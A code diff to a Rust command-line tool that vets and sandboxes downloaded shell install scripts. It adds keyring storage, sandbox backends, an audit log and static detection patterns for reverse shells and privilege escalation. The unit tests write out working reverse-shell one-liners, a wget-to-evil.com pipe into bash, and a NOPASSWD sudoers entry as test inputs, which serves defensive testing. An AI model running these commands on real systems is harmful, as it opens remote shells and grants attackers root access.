@@ -5,9 +5,10 @@ use futures_util::StreamExt;
 use indicatif::{ProgressBar, ProgressStyle};
 use regex::Regex;
 use serde::{Deserialize, Serialize};
+use sha2::{Digest, Sha256};
 use std::fs;
 use std::io::{self, Write};
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::process::Command;
 use std::time::{Duration, SystemTime};
 use tempfile::NamedTempFile;
@@ -46,7 +47,23 @@ impl Config {
             );
         }
         let content = fs::read_to_string(path)?;
-        toml::from_str(&content).context("Failed to parse config file")
+        let mut config: Config = toml::from_str(&content).context("Failed to parse config file")?;
+
+        // If api_key is the sentinel "keyring", load from OS keyring
+        if config.api_key == "keyring" {
+            match load_api_key_keyring(&config.provider) {
+                Ok(key) => config.api_key = key,
+                Err(e) => {
+                    anyhow::bail!(
+                        "API key is stored in OS keyring but could not be loaded: {}. \
+                         You can set SCURL_API_KEY env var or run 'scurl login' again.",
+                        e
+                    );
+                }
+            }
+        }
+
+        Ok(config)
     }
 
     fn save(&self) -> Result<()> {
@@ -96,6 +113,23 @@ impl Config {
     }
 }
 
+fn store_api_key_keyring(provider: &str, key: &str) -> Result<()> {
+    let entry = keyring::Entry::new("scurl", provider)
+        .context("Failed to create keyring entry")?;
+    entry
+        .set_password(key)
+        .context("Failed to store API key in OS keyring")?;
+    Ok(())
+}
+
+fn load_api_key_keyring(provider: &str) -> Result<String> {
+    let entry = keyring::Entry::new("scurl", provider)
+        .context("Failed to create keyring entry")?;
+    entry
+        .get_password()
+        .context("Failed to load API key from OS keyring")
+}
+
 // ============================================================================
 // CLI
 // ============================================================================
@@ -119,6 +153,10 @@ struct Cli {
     /// Auto-execute if classified as probably safe
     #[arg(short, long, global = true)]
     auto_execute: bool,
+
+    /// Disable sandboxed script execution
+    #[arg(long, global = true)]
+    no_sandbox: bool,
 
     /// Override provider from config
     #[arg(short = 'p', long, global = true)]
@@ -891,6 +929,52 @@ fn parse_analysis(text: &str) -> Result<SecurityAnalysis> {
         }
     };
 
+    // Contradiction detection: escalate risk if findings contradict the stated level
+    let risk_level = {
+        let mut level = risk_level;
+        let findings_lower: Vec<String> =
+            findings.iter().map(|f| f.to_lowercase()).collect();
+        let all_findings_text = findings_lower.join(" ");
+
+        let dangerous_keywords = [
+            "reverse shell",
+            "backdoor",
+            "exfiltration",
+            "malicious",
+            "critical",
+            "dangerous",
+            "trojan",
+            "keylogger",
+            "rootkit",
+            "exploit",
+        ];
+
+        if matches!(level, RiskLevel::Safe | RiskLevel::Low) {
+            let has_dangerous = dangerous_keywords
+                .iter()
+                .any(|kw| all_findings_text.contains(kw));
+            if has_dangerous {
+                eprintln!(
+                    "{} AI rated script as {:?} but findings mention dangerous keywords — escalating to HIGH.",
+                    "⚠".yellow(),
+                    level
+                );
+                level = RiskLevel::High;
+            }
+        }
+
+        if matches!(level, RiskLevel::Safe) && findings.len() >= 5 {
+            eprintln!(
+                "{} AI rated script as SAFE but reported {} findings — escalating to MEDIUM.",
+                "⚠".yellow(),
+                findings.len()
+            );
+            level = RiskLevel::Medium;
+        }
+
+        level
+    };
+
     Ok(SecurityAnalysis {
         risk_level,
         findings,
@@ -934,6 +1018,17 @@ fn display_analysis(analysis: &SecurityAnalysis) {
     println!(
         "{}",
         "═══════════════════════════════════════════════════".bright_white()
+    );
+
+    println!(
+        "\n{}",
+        "Note: This analysis reduces but does not eliminate the risk of executing"
+            .bright_black()
+    );
+    println!(
+        "{}",
+        "remote code. Always verify scripts from untrusted sources manually."
+            .bright_black()
     );
 }
 
@@ -1131,6 +1226,55 @@ fn static_patterns() -> Vec<StaticPattern> {
             severity: StaticSeverity::Medium,
             description: "Silent download to /tmp",
             regex_str: r"(curl|wget)\s+(-s|--silent|--quiet).*(/tmp|/var/tmp)",
+        },
+        StaticPattern {
+            id: "SHELL-BASH-INTERACTIVE",
+            category: PatternCategory::ShellSecurity,
+            severity: StaticSeverity::Critical,
+            description: "Interactive bash reverse shell via /dev/tcp",
+            regex_str: r"bash\s+-i\s+>&\s*/dev/tcp",
+        },
+        StaticPattern {
+            id: "SHELL-MKFIFO-SHELL",
+            category: PatternCategory::ShellSecurity,
+            severity: StaticSeverity::Critical,
+            description: "Reverse shell using mkfifo pipe",
+            regex_str: r"mkfifo\s+.*\|\s*.*(bash|sh|nc|ncat)",
+        },
+        StaticPattern {
+            id: "SHELL-SOCAT-SHELL",
+            category: PatternCategory::ShellSecurity,
+            severity: StaticSeverity::Critical,
+            description: "Socat exec reverse shell",
+            regex_str: r"socat\s+.*exec.*(/bin/bash|/bin/sh)",
+        },
+        StaticPattern {
+            id: "SHELL-PATH-MANIPULATION",
+            category: PatternCategory::ShellSecurity,
+            severity: StaticSeverity::High,
+            description: "PATH variable overwrite to hijack commands",
+            regex_str: r#"(?:^|;|\s)PATH\s*=\s*["']?/"#,
+        },
+        StaticPattern {
+            id: "SHELL-WGET-PIPE",
+            category: PatternCategory::ShellSecurity,
+            severity: StaticSeverity::High,
+            description: "Wget output piped to shell execution",
+            regex_str: r"wget\s+.*-O\s*-.*\|\s*(bash|sh)",
+        },
+        StaticPattern {
+            id: "SHELL-ALIAS-OVERRIDE",
+            category: PatternCategory::ShellSecurity,
+            severity: StaticSeverity::Medium,
+            description: "Alias override of security-critical commands",
+            regex_str: r"alias\s+(sudo|ssh|su|login|passwd|gpg)\s*=",
+        },
+        StaticPattern {
+            id: "SHELL-SUDOERS-MODIFY",
+            category: PatternCategory::ShellSecurity,
+            severity: StaticSeverity::Critical,
+            description: "Writing to /etc/sudoers",
+            regex_str: r"/etc/sudoers",
         },
         // Prompt Injection Patterns - ALL Critical
         StaticPattern {
@@ -1477,6 +1621,14 @@ async fn download_script(url: &str, net_config: &NetworkConfig) -> Result<String
                             anyhow::bail!("Downloaded script is empty");
                         }
 
+                        // Reject scripts containing null bytes
+                        if script.contains('\0') {
+                            spinner.finish_and_clear();
+                            anyhow::bail!(
+                                "Downloaded script contains null bytes. Valid shell scripts should not contain null bytes — this may indicate a binary or corrupted file."
+                            );
+                        }
+
                         spinner.finish_with_message(format!(
                             "{} Downloaded {} bytes",
                             "✓".green(),
@@ -1539,9 +1691,185 @@ fn prompt_user_confirmation() -> Result<bool> {
     Ok(matches!(input.trim().to_lowercase().as_str(), "y" | "yes"))
 }
 
-fn execute_script(script: &str, shell: &str) -> Result<()> {
-    println!("\n{}", format!("Executing script with {}...", shell).cyan());
+fn validate_shell(shell: &str) -> Result<()> {
+    const ALLOWED_SHELLS: &[&str] = &["bash", "sh", "zsh", "fish", "dash", "ksh", "csh", "tcsh"];
 
+    let shell_name = Path::new(shell)
+        .file_name()
+        .and_then(|n| n.to_str())
+        .unwrap_or(shell);
+
+    if !ALLOWED_SHELLS.contains(&shell_name) {
+        anyhow::bail!(
+            "Unknown shell: '{}'. Allowed shells: {}",
+            shell,
+            ALLOWED_SHELLS.join(", ")
+        );
+    }
+
+    // If it's an absolute path, verify it exists
+    if shell.contains('/') || shell.contains('\\') {
+        let path = Path::new(shell);
+        if !path.exists() {
+            anyhow::bail!("Shell binary not found: {}", shell);
+        }
+    } else {
+        // For bare names, verify via `which`
+        let result = Command::new("which")
+            .arg(shell)
+            .output()
+            .context("Failed to locate shell binary")?;
+        if !result.status.success() {
+            anyhow::bail!(
+                "Shell '{}' not found on this system. Is it installed?",
+                shell
+            );
+        }
+    }
+
+    Ok(())
+}
+
+// ============================================================================
+// Sandbox
+// ============================================================================
+
+#[derive(Debug, PartialEq)]
+#[allow(dead_code)]
+enum SandboxBackend {
+    Bwrap,
+    Firejail,
+    SandboxExec,
+}
+
+fn detect_sandbox_backend() -> Option<SandboxBackend> {
+    #[cfg(target_os = "macos")]
+    {
+        if command_exists("sandbox-exec") {
+            return Some(SandboxBackend::SandboxExec);
+        }
+    }
+
+    #[cfg(target_os = "linux")]
+    {
+        if command_exists("bwrap") {
+            return Some(SandboxBackend::Bwrap);
+        }
+        if command_exists("firejail") {
+            return Some(SandboxBackend::Firejail);
+        }
+    }
+
+    None
+}
+
+fn command_exists(name: &str) -> bool {
+    Command::new("which")
+        .arg(name)
+        .output()
+        .map(|o| o.status.success())
+        .unwrap_or(false)
+}
+
+fn execute_sandboxed_bwrap(
+    shell: &str,
+    script_path: &Path,
+) -> Result<std::process::ExitStatus> {
+    let script_path_str = script_path
+        .to_str()
+        .context("Script path is not valid UTF-8")?;
+
+    let mut cmd = Command::new("bwrap");
+
+    // Read-only bind mounts for system directories
+    for dir in &["/usr", "/bin", "/lib", "/lib64", "/etc"] {
+        if Path::new(dir).exists() {
+            cmd.arg("--ro-bind").arg(dir).arg(dir);
+        }
+    }
+
+    // Minimal device access
+    cmd.arg("--dev").arg("/dev");
+    // PID namespace support
+    cmd.arg("--proc").arg("/proc");
+    // Fresh writable /tmp
+    cmd.arg("--tmpfs").arg("/tmp");
+    // Script file read-only
+    cmd.arg("--ro-bind").arg(script_path_str).arg(script_path_str);
+    // Namespace isolation
+    cmd.arg("--unshare-net");
+    cmd.arg("--unshare-pid");
+    cmd.arg("--unshare-ipc");
+    cmd.arg("--unshare-uts");
+    cmd.arg("--unshare-cgroup");
+    // Security hardening
+    cmd.arg("--new-session");
+    cmd.arg("--die-with-parent");
+    // Shell and script
+    cmd.arg(shell).arg(script_path_str);
+
+    cmd.status()
+        .context("Failed to execute script in bwrap sandbox")
+}
+
+fn execute_sandboxed_firejail(
+    shell: &str,
+    script_path: &Path,
+) -> Result<std::process::ExitStatus> {
+    eprintln!(
+        "{} Using firejail (SUID sandbox). For stronger isolation, install bubblewrap: {}",
+        "Note:".yellow().bold(),
+        "apt install bubblewrap".cyan()
+    );
+
+    let script_path_str = script_path
+        .to_str()
+        .context("Script path is not valid UTF-8")?;
+
+    Command::new("firejail")
+        .arg("--noprofile")
+        .arg("--net=none")
+        .arg("--read-only=/")
+        .arg("--whitelist=/tmp")
+        .arg("--quiet")
+        .arg(shell)
+        .arg(script_path_str)
+        .status()
+        .context("Failed to execute script in firejail sandbox")
+}
+
+fn execute_sandboxed_macos(
+    shell: &str,
+    script_path: &Path,
+) -> Result<std::process::ExitStatus> {
+    let script_path_str = script_path
+        .to_str()
+        .context("Script path is not valid UTF-8")?;
+
+    let profile = format!(
+        r#"(version 1)
+(deny default)
+(allow file-read* (subpath "/usr") (subpath "/bin") (subpath "/sbin")
+    (subpath "/System") (subpath "/Library") (subpath "/private/etc")
+    (subpath "/dev"))
+(allow file-read* (literal "{}"))
+(allow file-write* (subpath "/private/tmp") (subpath "/tmp"))
+(allow process-exec) (allow process-fork)
+(deny network*)
+(allow sysctl-read) (allow mach-lookup)"#,
+        script_path_str
+    );
+
+    Command::new("sandbox-exec")
+        .arg("-p")
+        .arg(&profile)
+        .arg(shell)
+        .arg(script_path_str)
+        .status()
+        .context("Failed to execute script in macOS sandbox")
+}
+
+fn execute_script(script: &str, shell: &str, sandbox: bool) -> Result<()> {
     let mut temp_file = NamedTempFile::new()?;
     temp_file.write_all(script.as_bytes())?;
     let temp_path = temp_file.path();
@@ -1554,10 +1882,54 @@ fn execute_script(script: &str, shell: &str) -> Result<()> {
         std::fs::set_permissions(temp_path, perms)?;
     }
 
-    let status = Command::new(shell)
-        .arg(temp_path)
-        .status()
-        .context(format!("Failed to execute script with {}", shell))?;
+    let status = if sandbox {
+        let backend = detect_sandbox_backend();
+        match backend {
+            Some(SandboxBackend::Bwrap) => {
+                println!(
+                    "\n{}",
+                    "Executing script in sandbox (bwrap)...".cyan()
+                );
+                execute_sandboxed_bwrap(shell, temp_path)?
+            }
+            Some(SandboxBackend::Firejail) => {
+                println!(
+                    "\n{}",
+                    "Executing script in sandbox (firejail)...".cyan()
+                );
+                execute_sandboxed_firejail(shell, temp_path)?
+            }
+            Some(SandboxBackend::SandboxExec) => {
+                println!(
+                    "\n{}",
+                    "Executing script in sandbox (sandbox-exec)...".cyan()
+                );
+                execute_sandboxed_macos(shell, temp_path)?
+            }
+            None => {
+                let install_hint = if cfg!(target_os = "linux") {
+                    "Install bubblewrap: sudo apt install bubblewrap (Debian/Ubuntu) or sudo dnf install bubblewrap (Fedora)"
+                } else if cfg!(target_os = "macos") {
+                    "sandbox-exec should be available on macOS by default. Check your PATH."
+                } else {
+                    "No supported sandbox backend found for this platform."
+                };
+                anyhow::bail!(
+                    "Sandbox backend not found. {}\nTo run without sandboxing, use --no-sandbox",
+                    install_hint
+                );
+            }
+        }
+    } else {
+        println!(
+            "\n{}",
+            format!("Executing script with {} (no sandbox)...", shell).cyan()
+        );
+        Command::new(shell)
+            .arg(temp_path)
+            .status()
+            .context(format!("Failed to execute script with {}", shell))?
+    };
 
     if !status.success() {
         anyhow::bail!(
@@ -1750,10 +2122,26 @@ async fn login_command(cli: &Cli) -> Result<()> {
         }
     }
 
+    // Attempt to store API key in OS keyring first
+    let (config_api_key, key_storage_msg) = match store_api_key_keyring(provider_name, &api_key) {
+        Ok(()) => {
+            // Store sentinel value in config file so we know to load from keyring
+            ("keyring".to_string(), "API key stored securely in OS keyring.")
+        }
+        Err(e) => {
+            eprintln!(
+                "\n{} Could not store API key in OS keyring: {}. Falling back to config file.",
+                "⚠".yellow(),
+                e
+            );
+            (api_key, "API key stored in plaintext config file. For maximum security, use SCURL_API_KEY env var instead.")
+        }
+    };
+
     // Save configuration
     let config = Config {
         provider: provider_name.to_string(),
-        api_key,
+        api_key: config_api_key,
         model,
         azure_endpoint,
         azure_deployment,
@@ -1767,7 +2155,7 @@ async fn login_command(cli: &Cli) -> Result<()> {
         Config::config_path()?.display().to_string().bright_black()
     );
 
-    println!("\n{} API key stored in plaintext. For maximum security, use SCURL_API_KEY env var instead.", "ℹ".blue());
+    println!("\n{} {}", "ℹ".blue(), key_storage_msg);
 
     println!("\n{}", "You're all set! Try:".green().bold());
     println!("  {}", "scurl https://example.com/install.sh".cyan());
@@ -1890,6 +2278,91 @@ Pass through any flags the user requests:
     Ok(())
 }
 
+#[allow(clippy::too_many_arguments)]
+fn write_audit_log(
+    url: &str,
+    script_hash: &str,
+    script_size: usize,
+    static_finding_count: usize,
+    has_critical: bool,
+    has_prompt_injection: bool,
+    ai_risk_level: &str,
+    decision: &str,
+    sandboxed: bool,
+) {
+    let log_result = (|| -> Result<()> {
+        let dir = Config::config_dir()?;
+        fs::create_dir_all(&dir)?;
+
+        let log_path = dir.join("audit.log");
+
+        // Get ISO 8601 timestamp
+        let now = SystemTime::now()
+            .duration_since(SystemTime::UNIX_EPOCH)
+            .unwrap_or(Duration::from_secs(0));
+        let secs = now.as_secs();
+        // Simple ISO 8601 without external crate: seconds since epoch
+        // Format: YYYY-MM-DDTHH:MM:SSZ (compute from epoch)
+        let days = secs / 86400;
+        let time_of_day = secs % 86400;
+        let hours = time_of_day / 3600;
+        let minutes = (time_of_day % 3600) / 60;
+        let seconds = time_of_day % 60;
+
+        // Compute date from days since epoch (1970-01-01)
+        let (year, month, day) = days_to_date(days);
+
+        let timestamp = format!(
+            "{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z",
+            year, month, day, hours, minutes, seconds
+        );
+
+        // Escape JSON string values
+        let url_escaped = url.replace('\\', "\\\\").replace('"', "\\\"");
+
+        let entry = format!(
+            "{{\"timestamp\":\"{}\",\"url\":\"{}\",\"sha256\":\"{}\",\"size_bytes\":{},\"static_findings\":{},\"has_critical\":{},\"has_prompt_injection\":{},\"ai_risk_level\":\"{}\",\"decision\":\"{}\",\"sandboxed\":{}}}\n",
+            timestamp, url_escaped, script_hash, script_size, static_finding_count, has_critical, has_prompt_injection, ai_risk_level, decision, sandboxed
+        );
+
+        use std::fs::OpenOptions;
+        let mut file = OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(&log_path)?;
+
+        // Set permissions to 0600
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            fs::set_permissions(&log_path, fs::Permissions::from_mode(0o600))?;
+        }
+
+        file.write_all(entry.as_bytes())?;
+        Ok(())
+    })();
+
+    if let Err(e) = log_result {
+        eprintln!("{} Failed to write audit log: {}", "⚠".yellow(), e);
+    }
+}
+
+/// Convert days since Unix epoch to (year, month, day)
+fn days_to_date(days: u64) -> (u64, u64, u64) {
+    // Algorithm from http://howardhinnant.github.io/date_algorithms.html
+    let z = days + 719468;
+    let era = z / 146097;
+    let doe = z - era * 146097;
+    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
+    let y = yoe + era * 400;
+    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
+    let mp = (5 * doy + 2) / 153;
+    let d = doy - (153 * mp + 2) / 5 + 1;
+    let m = if mp < 10 { mp + 3 } else { mp - 9 };
+    let y = if m <= 2 { y + 1 } else { y };
+    (y, m, d)
+}
+
 async fn analyze_command(url: &str, cli: &Cli) -> Result<()> {
     println!(
         "\n{} {}\n",
@@ -1939,11 +2412,29 @@ async fn analyze_command(url: &str, cli: &Cli) -> Result<()> {
         );
     }
 
+    if cli.auto_execute {
+        eprintln!(
+            "\n{}\n{}\n",
+            "WARNING: Auto-execute mode is enabled. Scripts classified as SAFE or LOW"
+                .yellow()
+                .bold(),
+            "will be executed without confirmation. Use with caution."
+                .yellow()
+                .bold()
+        );
+    }
+
     // Validate URL
     validate_url(url)?;
 
     // Download the script
     let script = download_script(url, &net_config).await?;
+
+    // Compute SHA-256 hash
+    let mut hasher = Sha256::new();
+    hasher.update(script.as_bytes());
+    let script_hash = format!("{:x}", hasher.finalize());
+    println!("{} {}", "SHA-256:".bold(), script_hash);
 
     // Run static analysis
     let static_report = static_analyze(&script);
@@ -1982,6 +2473,11 @@ async fn analyze_command(url: &str, cli: &Cli) -> Result<()> {
     // Display results
     display_analysis(&analysis);
 
+    // Validate shell before offering execution
+    validate_shell(&cli.shell)?;
+
+    let ai_risk_str = format!("{:?}", analysis.risk_level).to_uppercase();
+
     // Decide whether to execute
     let should_execute =
         if cli.auto_execute && analysis.risk_level.is_probably_safe() && !force_no_auto {
@@ -1997,19 +2493,49 @@ async fn analyze_command(url: &str, cli: &Cli) -> Result<()> {
                     .red()
                     .bold()
             );
+            // Show hash again before prompting
+            println!("{} {}", "SHA-256:".bold(), script_hash);
             prompt_user_confirmation()?
         } else if cli.auto_execute {
             println!(
                 "\n{}",
                 "✗ Auto-execute disabled due to risk level".red().bold()
             );
+            // Show hash again before prompting
+            println!("{} {}", "SHA-256:".bold(), script_hash);
             prompt_user_confirmation()?
         } else {
+            // Show hash again before prompting
+            println!("{} {}", "SHA-256:".bold(), script_hash);
             prompt_user_confirmation()?
         };
 
+    let decision = if should_execute {
+        if cli.auto_execute && analysis.risk_level.is_probably_safe() && !force_no_auto {
+            "auto-executed"
+        } else {
+            "user-approved"
+        }
+    } else {
+        "cancelled"
+    };
+
+    // Write audit log
+    let sandboxed = !cli.no_sandbox;
+    write_audit_log(
+        url,
+        &script_hash,
+        script.len(),
+        static_report.findings.len(),
+        static_report.has_critical,
+        static_report.has_prompt_injection,
+        &ai_risk_str,
+        decision,
+        sandboxed,
+    );
+
     if should_execute {
-        execute_script(&script, &cli.shell)?;
+        execute_script(&script, &cli.shell, !cli.no_sandbox)?;
     } else {
         println!("\n{}", "Execution cancelled by user".yellow());
     }
@@ -2376,5 +2902,189 @@ rm -rf /boot
 
         let config_path = Config::config_path().unwrap();
         assert!(config_path.ends_with("config.toml"));
+    }
+
+    // ========================================================================
+    // New security remediation tests
+    // ========================================================================
+
+    #[test]
+    fn test_validate_shell_known() {
+        // "sh" is universally available
+        assert!(validate_shell("sh").is_ok());
+        assert!(validate_shell("bash").is_ok());
+    }
+
+    #[test]
+    fn test_validate_shell_unknown() {
+        assert!(validate_shell("powershell").is_err());
+        assert!(validate_shell("cmd").is_err());
+        assert!(validate_shell("/tmp/evil-shell").is_err());
+        assert!(validate_shell("node").is_err());
+    }
+
+    #[test]
+    fn test_null_byte_detection() {
+        // Simulate what download_script would reject
+        let content = "#!/bin/bash\necho hello\0world";
+        assert!(content.contains('\0'));
+    }
+
+    #[test]
+    fn test_static_analysis_bash_interactive_reverse_shell() {
+        let script = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1";
+        let report = static_analyze(script);
+        assert!(report.has_critical);
+        assert!(report
+            .findings
+            .iter()
+            .any(|f| f.pattern_id == "SHELL-BASH-INTERACTIVE"));
+    }
+
+    #[test]
+    fn test_static_analysis_mkfifo_shell() {
+        let script = "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f";
+        let report = static_analyze(script);
+        assert!(report.has_critical);
+        assert!(report
+            .findings
+            .iter()
+            .any(|f| f.pattern_id == "SHELL-MKFIFO-SHELL"));
+    }
+
+    #[test]
+    fn test_static_analysis_socat_shell() {
+        let script = "socat exec:/bin/bash -,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444";
+        let report = static_analyze(script);
+        assert!(report.has_critical);
+        assert!(report
+            .findings
+            .iter()
+            .any(|f| f.pattern_id == "SHELL-SOCAT-SHELL"));
+    }
+
+    #[test]
+    fn test_static_analysis_path_manipulation() {
+        let script = "PATH=/tmp/evil:$PATH\nls";
+        let report = static_analyze(script);
+        assert!(report
+            .findings
+            .iter()
+            .any(|f| f.pattern_id == "SHELL-PATH-MANIPULATION"));
+    }
+
+    #[test]
+    fn test_static_analysis_wget_pipe() {
+        let script = "wget -O - https://evil.com/payload | bash";
+        let report = static_analyze(script);
+        assert!(report
+            .findings
+            .iter()
+            .any(|f| f.pattern_id == "SHELL-WGET-PIPE"));
+    }
+
+    #[test]
+    fn test_static_analysis_sudoers_modify() {
+        let script = "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers";
+        let report = static_analyze(script);
+        assert!(report.has_critical);
+        assert!(report
+            .findings
+            .iter()
+            .any(|f| f.pattern_id == "SHELL-SUDOERS-MODIFY"));
+    }
+
+    #[test]
+    fn test_contradiction_detection_safe_with_dangerous_findings() {
+        let text = r#"
+RISK_LEVEL: SAFE
+FINDINGS:
+- This script installs a reverse shell backdoor
+- It exfiltrates credentials
+RECOMMENDATION: This script is safe to execute.
+"#;
+        let result = parse_analysis(text).unwrap();
+        // Should be escalated from SAFE to HIGH due to "reverse shell", "backdoor", "exfiltrat"
+        assert_eq!(result.risk_level, RiskLevel::High);
+    }
+
+    #[test]
+    fn test_contradiction_detection_safe_with_many_findings() {
+        let text = r#"
+RISK_LEVEL: SAFE
+FINDINGS:
+- Finding one
+- Finding two
+- Finding three
+- Finding four
+- Finding five
+RECOMMENDATION: Looks good.
+"#;
+        let result = parse_analysis(text).unwrap();
+        // 5+ findings with SAFE should escalate to at least MEDIUM
+        assert!(matches!(
+            result.risk_level,
+            RiskLevel::Medium | RiskLevel::High | RiskLevel::Critical
+        ));
+    }
+
+    #[test]
+    fn test_audit_log_format() {
+        // Verify days_to_date produces correct results
+        // 2024-01-01 is day 19723 since epoch
+        let (y, m, d) = days_to_date(19723);
+        assert_eq!(y, 2024);
+        assert_eq!(m, 1);
+        assert_eq!(d, 1);
+
+        // 1970-01-01 is day 0
+        let (y, m, d) = days_to_date(0);
+        assert_eq!(y, 1970);
+        assert_eq!(m, 1);
+        assert_eq!(d, 1);
+    }
+
+    // ========================================================================
+    // Sandbox tests
+    // ========================================================================
+
+    #[test]
+    fn test_detect_sandbox_backend() {
+        let backend = detect_sandbox_backend();
+        // On macOS, should detect sandbox-exec; on Linux, bwrap or firejail
+        #[cfg(target_os = "macos")]
+        assert_eq!(backend, Some(SandboxBackend::SandboxExec));
+        #[cfg(target_os = "linux")]
+        assert!(
+            backend == Some(SandboxBackend::Bwrap)
+                || backend == Some(SandboxBackend::Firejail)
+                || backend.is_none()
+        );
+    }
+
+    #[test]
+    fn test_command_exists_positive() {
+        assert!(command_exists("sh"));
+    }
+
+    #[test]
+    fn test_command_exists_negative() {
+        assert!(!command_exists("nonexistent_binary_xyz"));
+    }
+
+    #[test]
+    fn test_sandbox_backend_debug() {
+        assert_eq!(format!("{:?}", SandboxBackend::Bwrap), "Bwrap");
+        assert_eq!(format!("{:?}", SandboxBackend::Firejail), "Firejail");
+        assert_eq!(format!("{:?}", SandboxBackend::SandboxExec), "SandboxExec");
+    }
+
+    #[test]
+    fn test_help_includes_no_sandbox() {
+        use clap::CommandFactory;
+        let mut buf = Vec::new();
+        Cli::command().write_help(&mut buf).unwrap();
+        let help_text = String::from_utf8(buf).unwrap();
+        assert!(help_text.contains("--no-sandbox"));
     }
 }
